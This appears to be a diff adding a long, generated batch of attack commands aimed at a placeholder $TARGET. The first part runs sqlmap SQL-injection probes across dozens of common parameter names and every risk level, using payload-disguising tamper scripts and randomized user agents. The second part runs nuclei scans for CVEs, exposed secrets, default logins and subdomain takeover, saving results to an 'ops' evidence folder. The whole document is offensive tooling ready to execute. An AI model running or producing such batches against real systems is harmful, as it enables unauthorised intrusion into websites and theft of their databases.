+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=5 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=5 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=1 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=1 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=1 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=2 --risk=1 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=2 --risk=2 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=2 --risk=3 --tamper=between --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=3 --risk=1 --tamper=between --random-agent --threads=2
+nuclei -u "$TARGET" -tags cve,exposure -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_exposure.txt"
+nuclei -u "$TARGET" -tags cve,misconfig -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_misconfig.txt"
+nuclei -u "$TARGET" -tags cve,tech -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_tech.txt"
+nuclei -u "$TARGET" -tags cve,wordpress -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_wordpress.txt"
+nuclei -u "$TARGET" -tags cve,wp -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_wp.txt"
+nuclei -u "$TARGET" -tags cve,sqli -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_sqli.txt"
+nuclei -u "$TARGET" -tags cve,xss -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_xss.txt"
+nuclei -u "$TARGET" -tags cve,ssrf -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_ssrf.txt"
+nuclei -u "$TARGET" -tags cve,lfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_lfi.txt"
+nuclei -u "$TARGET" -tags cve,rfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_rfi.txt"
+nuclei -u "$TARGET" -tags cve,takeover -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_takeover.txt"
+nuclei -u "$TARGET" -tags cve,default-login -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_default-login.txt"
+nuclei -u "$TARGET" -tags cve,token -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_token.txt"
+nuclei -u "$TARGET" -tags cve,api -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_api.txt"
+nuclei -u "$TARGET" -tags cve,graphql -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_graphql.txt"
+nuclei -u "$TARGET" -tags cve,debug -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_debug.txt"
+nuclei -u "$TARGET" -tags cve,backup -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_backup.txt"
+nuclei -u "$TARGET" -tags cve,config -o "$HOME/ops/$DOMAIN/evidence/nuclei_cve_config.txt"
+nuclei -u "$TARGET" -tags exposure,misconfig -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_misconfig.txt"
+nuclei -u "$TARGET" -tags exposure,tech -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_tech.txt"
+nuclei -u "$TARGET" -tags exposure,wordpress -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_wordpress.txt"
+nuclei -u "$TARGET" -tags exposure,wp -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_wp.txt"
+nuclei -u "$TARGET" -tags exposure,sqli -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_sqli.txt"
+nuclei -u "$TARGET" -tags exposure,xss -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_xss.txt"
+nuclei -u "$TARGET" -tags exposure,ssrf -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_ssrf.txt"
+nuclei -u "$TARGET" -tags exposure,lfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_lfi.txt"
+nuclei -u "$TARGET" -tags exposure,rfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_rfi.txt"
+nuclei -u "$TARGET" -tags exposure,takeover -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_takeover.txt"
+nuclei -u "$TARGET" -tags exposure,default-login -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_default-login.txt"
+nuclei -u "$TARGET" -tags exposure,token -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_token.txt"
+nuclei -u "$TARGET" -tags exposure,api -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_api.txt"
+nuclei -u "$TARGET" -tags exposure,graphql -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_graphql.txt"
+nuclei -u "$TARGET" -tags exposure,debug -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_debug.txt"
+nuclei -u "$TARGET" -tags exposure,backup -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_backup.txt"
+nuclei -u "$TARGET" -tags exposure,config -o "$HOME/ops/$DOMAIN/evidence/nuclei_exposure_config.txt"
+nuclei -u "$TARGET" -tags misconfig,tech -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_tech.txt"
+nuclei -u "$TARGET" -tags misconfig,wordpress -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_wordpress.txt"
+nuclei -u "$TARGET" -tags misconfig,wp -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_wp.txt"
+nuclei -u "$TARGET" -tags misconfig,sqli -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_sqli.txt"
+nuclei -u "$TARGET" -tags misconfig,xss -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_xss.txt"
+nuclei -u "$TARGET" -tags misconfig,ssrf -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_ssrf.txt"
+nuclei -u "$TARGET" -tags misconfig,lfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_lfi.txt"
+nuclei -u "$TARGET" -tags misconfig,rfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_rfi.txt"
+nuclei -u "$TARGET" -tags misconfig,takeover -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_takeover.txt"
+nuclei -u "$TARGET" -tags misconfig,default-login -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_default-login.txt"
+nuclei -u "$TARGET" -tags misconfig,token -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_token.txt"
+nuclei -u "$TARGET" -tags misconfig,api -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_api.txt"
+nuclei -u "$TARGET" -tags misconfig,graphql -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_graphql.txt"
+nuclei -u "$TARGET" -tags misconfig,debug -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_debug.txt"
+nuclei -u "$TARGET" -tags misconfig,backup -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_backup.txt"
+nuclei -u "$TARGET" -tags misconfig,config -o "$HOME/ops/$DOMAIN/evidence/nuclei_misconfig_config.txt"
+nuclei -u "$TARGET" -tags tech,wordpress -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_wordpress.txt"
+nuclei -u "$TARGET" -tags tech,wp -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_wp.txt"
+nuclei -u "$TARGET" -tags tech,sqli -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_sqli.txt"
+nuclei -u "$TARGET" -tags tech,xss -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_xss.txt"
+nuclei -u "$TARGET" -tags tech,ssrf -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_ssrf.txt"
+nuclei -u "$TARGET" -tags tech,lfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_lfi.txt"
+nuclei -u "$TARGET" -tags tech,rfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_rfi.txt"
+nuclei -u "$TARGET" -tags tech,takeover -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_takeover.txt"
+nuclei -u "$TARGET" -tags tech,default-login -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_default-login.txt"
+nuclei -u "$TARGET" -tags tech,token -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_token.txt"
+nuclei -u "$TARGET" -tags tech,api -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_api.txt"
+nuclei -u "$TARGET" -tags tech,graphql -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_graphql.txt"
+nuclei -u "$TARGET" -tags tech,debug -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_debug.txt"
+nuclei -u "$TARGET" -tags tech,backup -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_backup.txt"
+nuclei -u "$TARGET" -tags tech,config -o "$HOME/ops/$DOMAIN/evidence/nuclei_tech_config.txt"
+nuclei -u "$TARGET" -tags wordpress,wp -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_wp.txt"
+nuclei -u "$TARGET" -tags wordpress,sqli -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_sqli.txt"
+nuclei -u "$TARGET" -tags wordpress,xss -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_xss.txt"
+nuclei -u "$TARGET" -tags wordpress,ssrf -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_ssrf.txt"
+nuclei -u "$TARGET" -tags wordpress,lfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_lfi.txt"
+nuclei -u "$TARGET" -tags wordpress,rfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_rfi.txt"
+nuclei -u "$TARGET" -tags wordpress,takeover -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_takeover.txt"
+nuclei -u "$TARGET" -tags wordpress,default-login -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_default-login.txt"
+nuclei -u "$TARGET" -tags wordpress,token -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_token.txt"
+nuclei -u "$TARGET" -tags wordpress,api -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_api.txt"
+nuclei -u "$TARGET" -tags wordpress,graphql -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_graphql.txt"
+nuclei -u "$TARGET" -tags wordpress,debug -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_debug.txt"
+nuclei -u "$TARGET" -tags wordpress,backup -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_backup.txt"
+nuclei -u "$TARGET" -tags wordpress,config -o "$HOME/ops/$DOMAIN/evidence/nuclei_wordpress_config.txt"
+nuclei -u "$TARGET" -tags wp,sqli -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_sqli.txt"
+nuclei -u "$TARGET" -tags wp,xss -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_xss.txt"
+nuclei -u "$TARGET" -tags wp,ssrf -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_ssrf.txt"
